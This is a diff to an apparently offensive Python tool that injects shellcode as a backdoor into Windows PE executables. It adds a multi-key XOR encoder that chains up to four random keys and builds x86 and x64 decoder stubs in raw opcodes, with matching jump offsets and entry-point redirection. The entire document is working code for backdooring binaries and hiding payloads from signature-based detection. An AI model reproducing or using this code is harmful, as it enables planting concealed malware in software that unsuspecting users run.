@@ -34,9 +34,13 @@ parser.add_argument('--encoder','-e',
                     default=False,
                     required=False,
                     dest='encoder')
+parser.add_argument('--multi-encoder','-m',
+                    help='Specify the number of auto-generated keys to encode shellcode (optional)',
+                    type=int,
+                    default=False,
+                    required=False,
+                    dest='encodermultiple')
 args = parser.parse_args()
-
-
 
 # Colour Function Defintions
 def PrintGreen(text):
@@ -267,9 +271,6 @@ else:
         shellcode = shellcode64
 
     x64 = True
-    if args.encoder:
-        print(PrintRed("[!]") + " Encoding Not Applied as x64")
-
     if (args.info):
         print(PrintRed("[!]") + " Backdoor not injected")
 
@@ -298,6 +299,9 @@ origEntryPoint = (pe.OPTIONAL_HEADER.AddressOfEntryPoint)
 # Perform injection - Info not set
 if args.info is False:
 
+    if len(shellcode) < 10:
+        sys.exit(PrintRed("[!]") + " Minimum shellcode size 10 bytes")
+
     # Sets new Entry Point and aligns address
     aslr_ep = newEntryPoint - image_base
     epAdjustedSize = 0
@@ -311,10 +315,6 @@ if args.info is False:
         pe.OPTIONAL_HEADER.AddressOfEntryPoint = aslr_ep
 
     print(PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(aslr_ep))
-    #
-    # else:
-    #     pe.OPTIONAL_HEADER.AddressOfEntryPoint = newRawOffset
-    #     print (PrintBlue("[i]") + " New Entry Point:\t\t"  '0x{:08x}'.format(newRawOffset))
 
     # Reformat original instruction return address to little endian
     if x64:
@@ -326,35 +326,77 @@ if args.info is False:
 
     if args.encoder:
 
-        endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16)
+        print(PrintGreen("\n[+]") + " Shellcode Encoding:")
+
+        encodedShellcode = shellcode
+        encoderCount = 1
+
+        if args.encodermultiple:
+            encoderCount = args.encodermultiple
+            if encoderCount > 4:
+                encoderCount = 4
+
+            xorInstructions = b""
+            for x in range(encoderCount):
+                encodingKey = os.urandom(1)
+                xorInstructions += b"\x80\x30" + encodingKey
+
+                print("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
+                encodedShellcode = (xor(encodedShellcode, encodingKey))
+
+            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16) + int(
+                hex((encoderCount - 1) * 3), 16)
+            if x64:
+                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))
+            else:
+                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16) + ((encoderCount - 1) * 3))
+        else:
+            encodingKey = os.urandom(1)  # b"\x2f"
+            xorInstructions = b"\x80\x30" + encodingKey
+            encodedShellcode = (xor(encodedShellcode, encodingKey))
+            print ("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
+            if x64:
+                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
+            else:
+                startDecodeAddress = (int(hex(newEntryPoint), 16) + int(hex(0x14), 16))
+
+            endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16)
         if x64:
             endDecodeAddressLittle = (endDecodeAddress + 0x16).to_bytes(8, 'little')
         else:
             endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(4, 'little')
-        encodingKey = os.urandom(1)  # b"\x2f"
 
-        print(PrintGreen("\n[+]") + " Shellcode Encoding:")
-        print ("\tXOR Key:\t\t\\x" + encodingKey.hex().upper())
-        print("\tStart address:\t\t" + hex(newEntryPoint))
+
+        print("\tStart address:\t\t" + (hex(int(hex(newEntryPoint), 16) + int(hex(0x1b), 16) + ((encoderCount - 1) * 3))))#hex(newEntryPoint))
         print("\tEnd Address:\t\t" + hex(endDecodeAddress))
 
         if x64:
 
-            xorDecoder = b"\x48\xb8" + (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16)).to_bytes(8, 'little')
-            xorDecoder += b"\x80\x30" + encodingKey
+            xorDecoder = b"\x48\xb8" + startDecodeAddress.to_bytes(8, 'little') # (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16))
+            xorDecoder += xorInstructions
+            #xorDecoder += b"\x80\x30" + encodingKey
             xorDecoder += b"\x48\xFF\xC0"
             xorDecoder += b"\x3D" + endDecodeAddressLittle[:4]
-            xorDecoder += b"\x7e\xf3"
 
-            shellcode = xorDecoder + (xor(shellcode, encodingKey))
+            # JMP Short\xf3 default 1 key
+            shortJmp = 0xf3
+            shortJmp = shortJmp - (int(str((encoderCount - 1)  * 3), 16))
+            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little') #"\xf3"
+
+            shellcode = xorDecoder + encodedShellcode
 
         else:
-            xorDecoder = b"\xB8" + (int(hex(newEntryPoint),16) + int(hex(0x14),16)).to_bytes(4, 'little')
-            xorDecoder += b"\x80\x30" + encodingKey
+            xorDecoder = b"\xB8" + startDecodeAddress.to_bytes(4, 'little') #(int(hex(newEntryPoint),16) + int(hex(0x14),16))
+            xorDecoder += xorInstructions
+            #xorDecoder += b"\x80\x30" + encodingKey
             xorDecoder += b"\x40"
             xorDecoder += b"\x3d" + endDecodeAddressLittle
-            xorDecoder += b"\x7e\xf5"
-            shellcode = xorDecoder + (xor(shellcode, encodingKey))
+
+            # JMP Short\xf5 default 1 key
+            shortJmp = 0xf5
+            shortJmp = shortJmp - (int(str(encoderCount - 1), 16) * 3)
+            xorDecoder += b"\x7e" + shortJmp.to_bytes(1, 'little')
+            shellcode = xorDecoder + encodedShellcode
 
     if x64:
         # Balance address to  %4 b
@@ -367,7 +409,6 @@ if args.info is False:
         paddingBytes = b""
         if len(shellcode) % 4 != 0:
             paddingBytes = b"\x90" * epAdjustedSize
-            print (len(paddingBytes))
             shellcode += paddingBytes
 
         shellcode += (b"\xFF\xe0")
@@ -381,7 +422,6 @@ if args.info is False:
         paddingBytes = b""
         if len(shellcode) % 4 != 0:
             paddingBytes = b"\x90" * epAdjustedSize
-            print (len(paddingBytes))
             shellcode += paddingBytes
 
         shellcode += (b"\xFF\xD0")
